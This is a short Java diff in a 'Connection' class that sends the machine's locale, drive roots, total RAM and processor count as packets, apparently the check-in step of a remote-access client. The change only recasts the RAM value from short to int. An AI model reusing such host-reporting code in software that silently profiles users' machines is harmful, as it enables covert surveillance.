@@ -146,8 +146,9 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet10InitDefaultLocale(Locale.getDefault()));
 
 		addToSendQueue(new Packet62InitDrives(File.listRoots()));
-
-		addToSendQueue(new Packet63InitRAM((short) (((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize() / 1024L / 1024L)));
+		
+		int ram = (int) (((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize() / 1024L / 1024L);
+		addToSendQueue(new Packet63InitRAM(ram));
 
 		addToSendQueue(new Packet64InitAvailableProcessors(Runtime.getRuntime().availableProcessors()));
 
